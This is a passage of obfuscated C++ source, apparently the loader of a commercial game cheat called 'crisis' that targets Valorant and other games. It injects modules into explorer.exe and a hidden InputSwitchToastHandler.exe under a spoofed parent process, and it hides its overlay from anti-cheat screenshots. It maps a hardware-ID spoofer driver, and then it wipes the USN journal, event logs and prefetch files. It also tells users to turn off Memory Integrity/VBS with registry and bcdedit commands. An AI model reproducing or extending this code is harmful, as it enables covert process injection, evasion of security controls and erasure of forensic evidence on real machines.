			dump_dbgmon( );
			utility::exit_process( );
		}

		obf_bogus_16( );

		memory::m_read_physical = [ ]( std::uint64_t addr, void* buffer, std::size_t size ) -> bool {
			return g_memory->read( addr, buffer, size );
			};
		memory::m_write_physical = [ ]( std::uint64_t addr, void* buffer, std::size_t size ) -> bool {
			return g_memory->write( addr, buffer, size );
			};

		obf_bogus_16( );

		if ( !g_paging->setup( ) ) {
			obf_bogus_16( );
			logging::print( obf( "failed to setup paging" ) );
			logging::print( obf( "contact support with this console.\n" ) );
			dump_dbgmon( );
			g_memory->close( );
			utility::exit_process( );
		}

		obf_bogus_16( );

		if ( !g_syscall->setup( g_pdb->get_symbol_address( obf( "KeServiceDescriptorTable" ) ), g_pdb->m_module_base ) ) {
			obf_bogus_16( );
			logging::print( obf( "failed to setup syscall" ) );
			logging::print( obf( "contact support with this console.\n" ) );
			dump_dbgmon( );
			g_memory->close( );
			utility::exit_process( );
		}

		obf_bogus_16( );
		logging::print( obf( "connected to memory module." ) );
		g_memory->benchmark( );
	}

	obf_bogus_16( );
	obf_indirect_branch;
	logging::print( obf( "preparing overlay module.." ) );
	obf_indirect_branch;

	if ( !g_overlay->open( ) ) {
		auto explorer = utility::find_pid( obf( L"explorer.exe" ) );
		if ( !explorer ) {
			logging::print( obf( "failed to find overlay process" ) );
			logging::print( obf( "contact support with this console.\n" ) );
			utility::exit_process( );
		}

		obf_bogus_16( );
		obf_indirect_branch;

		obf_bogus_16( );
		obf_indirect_branch;

		auto overlay = std::make_unique<module::c_module>(
			std::move( overlay_data ),
			explorer
		);

		obf_bogus_16( );
		obf_indirect_branch;

		if ( !overlay->inject( ) ) {
			logging::print( obf( "overlay unavailable - exiting without touching explorer.exe:" ) );
			logging::print( obf( "contact support with this console.\n" ) );
			dump_dbgmon( );
			overlay->unload( );
			utility::exit_process( );
		}

		overlay->cleanup( );
		obf_bogus_16( );

		obf_bogus_16( );
		obf_indirect_branch;
	}

	if ( !g_overlay->ping( ) || !g_overlay->bring_to_top( ) ) {
		logging::print( obf( "overlay unavailable - exiting without touching explorer.exe:" ) );
		logging::print( obf( "contact support with this console.\n" ) );
		dump_dbgmon( );
		g_overlay->close( );
		g_memory->close( );
		utility::exit_process( );
	}

	const auto monitors = utility::enumerate_monitors( );
	if ( monitors.size( ) > 1 ) {
		std::uint32_t chosen = 0;
		for ( auto idx = 0; idx < monitors.size( ); ++idx ) {
			const auto& m = monitors[ idx ];
			const auto width = m.bounds.right - m.bounds.left;
			const auto height = m.bounds.bottom - m.bounds.top;

			wchar_t message[ 256 ] { };
			swprintf_s(
				message,
				obf(
					L"Select the monitor your game will be primarily displayed on.\n"
					L"Monitor information %u:\n"
					L"Resolution: %ldx%ld\n"
					L"Position: %s" ),
				idx + 1,
				width, height,
				idx == 0 ? L"Primary" : idx == 1 ? L"Second" : idx == 2 ? L"Third" : idx == 3 ? L"Fourth" : L"Other"
			);

			const auto result = MessageBoxW(
				nullptr,
				message,
				L"Select overlay monitor",
				MB_YESNO | MB_ICONQUESTION | MB_TOPMOST | MB_SETFOREGROUND
			);

			if ( result == IDYES ) {
				chosen = idx;
				break;
			}
		}

		if ( !g_overlay->set_monitor( chosen ) ) {
			logging::print( obf( "failed to move overlay (monitor: %u)\n" ), chosen );
			logging::print( obf( "overlay unavailable - exiting without touching explorer.exe:" ) );
			logging::print( obf( "contact support with this console.\n" ) );
			dump_dbgmon( );
			g_overlay->close( );
			g_memory->close( );
			utility::exit_process( );
		}

		obf_bogus_16( );
		obf_indirect_branch;
		logging::print( obf( "selected %ls monitor!" ),
			chosen == 0 ? L"primary" : chosen == 1 ? L"second" : chosen == 2 ? L"third" : chosen == 3 ? L"fourth" : L"other" );
	}
	else
		logging::print( obf( "selected default monitor!" ) );

#if development_environment
	auto result = MessageBoxW(
		nullptr,
		is_for_valorant ?
			L"Stream proof hides the overlay from anti-cheat screenshots.\n"
			L"Anti-cheat screenshots such as Vanguards will not capture the overlay.\n\n"
			L"Warning: Stream proof is heavily recommended for Valorant.\n"
			L"Disabling stream proof significantly increases your risk of detection.\n\n"
			L"Would you like to enable stream proof?"
		:
			L"Stream proof hides the overlay from anti-cheat screenshots.\n"
			L"Anti-cheat screenshots such as Vanguards will not capture the overlay.\n\n"
			L"Would you like to enable stream proof?",
		obf( L"Stream proof" ),
		MB_YESNO | MB_ICONQUESTION | MB_TOPMOST | MB_SETFOREGROUND
	);

	if ( result == IDYES ) {
		auto streamproof = std::make_unique< streamproof::c_streamproof >( );
		if ( !streamproof->setup( ) ) {
			obf_bogus_16( );
			logging::print( obf( "failed to initialize stream proof" ) );
			logging::print( obf( "contact support with this console.\n" ) );
			g_overlay->close( );
			g_memory->close( );
			utility::exit_process( );
		}

		if ( !streamproof->hide_overlay( true ) ) {
			obf_bogus_16( );
			logging::print( obf( "failed to hide overlay window" ) );
			logging::print( obf( "contact support with this console.\n" ) );
			g_overlay->close( );
			g_memory->close( );
			utility::exit_process( );
		}

		logging::print( obf( "enabled stream proof!\n" ) );
	}
	else {
		auto streamproof = std::make_unique< streamproof::c_streamproof >( );
		if ( !streamproof->setup( ) ) {
			obf_bogus_16( );
			logging::print( obf( "failed to initialize stream proof" ) );
			logging::print( obf( "contact support with this console.\n" ) );
			g_overlay->close( );
			g_memory->close( );
			utility::exit_process( );
		}

		if ( !streamproof->hide_overlay( false ) ) {
			obf_bogus_16( );
			logging::print( obf( "failed to hide overlay window" ) );
			logging::print( obf( "contact support with this console.\n" ) );
			g_overlay->close( );
			g_memory->close( );
			utility::exit_process( );
		}

		logging::print( obf( "disabled stream proof.\n" ) );
	}
#else
	logging::print( obf( "tip: valorant takes screenshots!" ) );
	logging::print( obf( "blocking screen capture.." ) );

	auto streamproof = std::make_unique< streamproof::c_streamproof >( );
	if ( !streamproof->setup( ) ) {
		obf_bogus_16( );
		logging::print( obf( "failed to initialize stream proof" ) );
		logging::print( obf( "contact support with this console.\n" ) );
			g_overlay->close( );
			g_memory->close( );
			utility::exit_process( );
		}

		if ( !streamproof->hide_overlay( true ) ) {
			obf_bogus_16( );
			logging::print( obf( "failed to hide overlay window" ) );
			logging::print( obf( "contact support with this console.\n" ) );
			g_overlay->close( );
			g_memory->close( );
			utility::exit_process( );
		}

		logging::print( obf( "enabled stream proof!\n" ) );
#endif

	obf_bogus_16( );
	obf_indirect_branch;
	logging::print( obf( "preparing spoofer module.." ) );
	obf_indirect_branch;

	if ( !is_for_valorant && !spoofer_data.empty( ) ) {
		if ( !utility::is_vvci_or_vbs_enabled( ) ) {
			obf_bogus_16( );
			obf_indirect_branch;

			if ( !g_cow->initialize( ) ) {
				obf_bogus_16( );
				logging::print( obf( "failed to setup cow" ) );
				g_service->unload( );
				g_driver->unload( );
				utility::exit_process( );
			}

			auto product_log = obf( L"C:\\crisis\\crisis.log" );
			if ( !utility::file_was_created_this_boot( product_log ) &&
				!utility::file_was_modified_this_boot( product_log ) && !spoofer_data.empty( ) ) {
				obf_bogus_16( );

				auto result = MessageBoxA( 0,
					obf(
						"Activating hardware spoofing means blocking and faking hardware identifiers.\n"
						"Games and anti-cheats will not recognize your machines identifiers.\n"
						"Hardware spoofing can be reversed by restarting.\n\n"
						"Warning: Hardware spoofing could cause corruption to windows components." ),
					obf( "Would you like to enable hardware spoofing?" ),
					MB_ICONQUESTION | MB_YESNO );

				if ( result == IDYES ) {
					obf_bogus_16( );
					logging::print( obf( "warning: hardware spoofing could cause corruption.." ) );
					obf_indirect_branch;

					obf_bogus_16( );

					auto mapper = std::make_unique< mapper::c_mapper >( spoofer_data );
					if ( !mapper->map( ) ) {
						obf_bogus_16( );
						logging::print( obf( "failed to map spoofer module" ) );
						logging::print( obf( "contact support with this console.\n" ) );
						g_overlay->close( );
						g_memory->close( );
						utility::exit_process( );
					}

					if ( !mapper->launch( std::string( obf( "crisis" ) ) ) ) {
						obf_bogus_16( );
						logging::print( obf( "failed to launch spoofer module" ) );
						logging::print( obf( "contact support with this console.\n" ) );
						g_overlay->close( );
						g_memory->close( );
						utility::exit_process( );
					}

					obf_bogus_64( );
					logging::print( obf( "connected to spoofer module.\n" ) );
					obf_indirect_branch;
				}
			}
			else {
				obf_bogus_64( );
				std::wstring age;
				if ( utility::get_file_download_age( product_log, age ) )
					logging::print( obf( "hardware spoofing for %ls." ), age.c_str( ) );

				obf_bogus_16( );
				logging::print( obf( "connected to spoofer module.\n" ) );
				obf_indirect_branch;
			}

			obf_bogus_16( );

			//const auto communication_host = utility::find_pid( obf( L"winlogon.exe" ) );
			//exception::c_exception communication;

			//if ( communication.setup( ) )
			//	communication.attach( communication_host );
			//else
			//	logging::print( obf( "communication: no channel after spoofer map" ) );
		}
		else {
			MessageBoxA( NULL,
				obf( "Some features are unavailable because Memory Integrity (HVCI) or Virtualization-Based Security (VBS) is enabled on this system.\n\n"
					"If a game or anti-cheat requires HVCI/VBS, you can safely ignore it.\n\n"
					"To disable it for full compatibility:\n"
					"  1. Open Windows Security  >  Device security  >  Core isolation details\n"
					"  2. Turn OFF \"Memory integrity\"\n"
					"  3. Reboot the PC\n\n"
					"If the toggle is greyed out, run the following in an elevated prompt and reboot:\n"
					"  reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v Enabled /t REG_DWORD /d 0 /f\n"
					"  bcdedit /set hypervisorlaunchtype off" ),
				obf( "Compatibility warning" ),
				MB_OK | MB_ICONWARNING );

			obf_bogus_16( );
			logging::print( obf( "warning: spoofer module not compatible.\n" ) );
			obf_indirect_branch;
		}
	}

	obf_bogus_16( );
	g_overlay->close( );
	g_memory->close( );

	obf_bogus_16( );
	logging::print( obf( "preparing bypass module.." ) );
	obf_indirect_branch;

	const auto explorer_pid = utility::find_pid( obf( L"explorer.exe" ) );
	auto parent_handle = explorer_pid
		? OpenProcess( PROCESS_CREATE_PROCESS, FALSE, explorer_pid )
		: static_cast< HANDLE >( nullptr );

	SIZE_T attr_size = 0;
	InitializeProcThreadAttributeList( nullptr, 1, 0, &attr_size );
	auto* attr_list = reinterpret_cast< LPPROC_THREAD_ATTRIBUTE_LIST >(
		HeapAlloc( GetProcessHeap( ), HEAP_ZERO_MEMORY, attr_size ) );
	if ( attr_list ) {
		InitializeProcThreadAttributeList( attr_list, 1, 0, &attr_size );
		if ( parent_handle )
			UpdateProcThreadAttribute( attr_list, 0,
				PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
				&parent_handle, sizeof( parent_handle ), nullptr, nullptr );
	}

	STARTUPINFOEXW si_ex { };
	si_ex.StartupInfo.cb        = sizeof( si_ex );
	si_ex.StartupInfo.dwFlags   = STARTF_USESHOWWINDOW;
	si_ex.StartupInfo.wShowWindow = SW_HIDE;
	si_ex.lpAttributeList       = attr_list;

	PROCESS_INFORMATION process_info = { };
	auto child_environment = build_child_environment(
		!developer_mode, player_token, pairing_code );
	if ( child_environment.empty( ) ) {
		clear_sensitive( access_token );
		clear_sensitive( player_token );
		clear_sensitive( pairing_code );
		if ( attr_list ) { DeleteProcThreadAttributeList( attr_list ); HeapFree( GetProcessHeap( ), 0, attr_list ); }
		if ( parent_handle ) CloseHandle( parent_handle );
		logging::print( obf( "failed to create child environment" ) );
		utility::exit_process( );
	}

	const DWORD create_flags = CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT |
		( attr_list ? EXTENDED_STARTUPINFO_PRESENT : 0u );
	const BOOL process_created = CreateProcessW(
		obf( L"C:\\Windows\\System32\\InputSwitchToastHandler.exe" ),
		nullptr,
		nullptr,
		nullptr,
		FALSE,
		create_flags,
		child_environment.data( ),
		nullptr,
		reinterpret_cast< LPSTARTUPINFOW >( &si_ex ),
		&process_info );
	clear_sensitive( child_environment );
	clear_sensitive( access_token );
	clear_sensitive( player_token );
	clear_sensitive( pairing_code );
	if ( !process_created ) {
		logging::print( obf( "failed to create process: 0x%x" ), GetLastError( ) );
		if ( attr_list ) { DeleteProcThreadAttributeList( attr_list ); HeapFree( GetProcessHeap( ), 0, attr_list ); }
		if ( parent_handle ) CloseHandle( parent_handle );
		logging::print( obf( "contact support with this console.\n" ) );
		dump_dbgmon( );
		utility::exit_process( );
	}

	if ( attr_list ) { DeleteProcThreadAttributeList( attr_list ); HeapFree( GetProcessHeap( ), 0, attr_list ); }
	if ( parent_handle ) CloseHandle( parent_handle );
	const auto close_external_host = [ & ]( bool terminate ) {
		if ( terminate && process_info.hProcess )
			TerminateProcess( process_info.hProcess, 1 );
		if ( process_info.hThread ) {
			CloseHandle( process_info.hThread );
			process_info.hThread = nullptr;
		}
		if ( process_info.hProcess ) {
			CloseHandle( process_info.hProcess );
			process_info.hProcess = nullptr;
		}
	};

	DWORD exit_code = 0;
	if ( GetExitCodeProcess( process_info.hProcess, &exit_code ) && exit_code != STILL_ACTIVE ) {
		logging::print( obf( "process exited early: 0x%x" ), exit_code );
		logging::print( obf( "contact support with this console.\n" ) );
		dump_dbgmon( );
		close_external_host( false );
		utility::exit_process( );
	}

	// Use the exact process we created. Searching by image name can select an
	// older instance, and this host can naturally exit before mapping finishes.
	input_switch_toast_handler = process_info.dwProcessId;

	obf_bogus_16( );
	obf_indirect_branch;

	auto pdb_blob = g_pdb->compress_to_memory( );
	if ( pdb_blob.empty( ) ) {
		logging::print( obf( "failed to compress pdb blob" ) );
		close_external_host( true );
		utility::exit_process( );
	}

	bypass::startup_t startup {};
	startup.m_magic          = bypass::magic_code;
	startup.m_version        = bypass::version;
	startup.m_size           = sizeof( startup );
	startup.m_system_dtb     = g_paging->m_directory_table_base;
	startup.m_pdb_blob_size  = static_cast< std::uint32_t >( pdb_blob.size( ) );

	if ( !startup.m_system_dtb || !startup.m_pdb_blob_size ) {
		logging::print( obf( "failed to resolve crisis-bypass startup fields" ) );
		close_external_host( true );
		utility::exit_process( );
	}

	std::vector< std::uint8_t > inject_buf( sizeof( startup ) + pdb_blob.size( ) );
	std::memcpy( inject_buf.data( ), &startup, sizeof( startup ) );
	std::memcpy( inject_buf.data( ) + sizeof( startup ), pdb_blob.data( ), pdb_blob.size( ) );

	auto bypass = std::make_unique<module::c_module>( std::move( bypass_data ), input_switch_toast_handler );
	if ( !bypass->inject( inject_buf.data( ), inject_buf.size( ) ) ) {
		logging::print( obf( "failed to inject bypass module." ) );
		logging::print( obf( "contact support with this console.\n" ) );
		dump_dbgmon( );
		bypass->unload( );
		close_external_host( true );
		utility::exit_process( );
	}

	obf_bogus_16( );

	bypass->cleanup( );
	obf_bogus_16( );
	obf_indirect_branch;

	logging::print( obf( "preparing external module.." ) );

	obf_bogus_16( );
	obf_indirect_branch;

	auto external = std::make_unique<module::c_module>( std::move( external_data ), input_switch_toast_handler );
	if ( !external->inject( ) ) {
		logging::print( obf( "failed to inject external module." ) );
		logging::print( obf( "contact support with this console.\n" ) );
		dump_dbgmon( );
		bypass->unload( );
		close_external_host( true );
		utility::exit_process( );
	}

	obf_bogus_16( );
	external->cleanup( );
	close_external_host( false );

	logging::print( obf( "external successfully created." ) );
	logging::print( obf( "if there's any problems provide the external log." ) );
	logging::print( obf( "you can close this console at any time.\n" ) );

	obf_bogus_16( );
	obf_indirect_branch;

	g_usn_journal->clear( );

	obf_bogus_64( );
	obf_indirect_branch;

	events::clean_sessions( );
	obf_bogus_16( );

	events::clear_channels( );
	obf_bogus_16( );

	g_prefetch->enumerate( );
	obf_bogus_16( );

	g_prefetch->wipe( );
	obf_bogus_16( );

	utility::toggle_privilege( SE_DEBUG_PRIVILEGE, false );
	utility::toggle_privilege( SE_BACKUP_PRIVILEGE, false );
	obf_bogus_16( );

	logging::print( obf( "external operation log:" ) );

	bool framework_initialized = false;

	while ( true ) {
		if ( WaitForSingleObject( process_info.hProcess, 0 ) == WAIT_OBJECT_0 ) {
			DWORD exit_code = 0;
			GetExitCodeProcess( process_info.hProcess, &exit_code );
			if ( !exit_code ) {
				logging::print( obf( "warning: external was terminated." ) );
				logging::print( obf( "warning: contact support with this console if this wasn't you." ) );
			}
			else {
				logging::print( obf( "external crashed: 0x%x" ), exit_code );
				logging::print( obf( "contact support with this console." ) );
			}

			if ( const HWND console_hwnd = GetConsoleWindow( ) ) {
				ShowWindow( console_hwnd, SW_RESTORE );
				SetForegroundWindow( console_hwnd );
				BringWindowToTop( console_hwnd );
			}

			utility::exit_process( 12 );
		}

		dump_dbgmon( );
		std::this_thread::sleep_for( std::chrono::milliseconds( 100 ) );
	}
}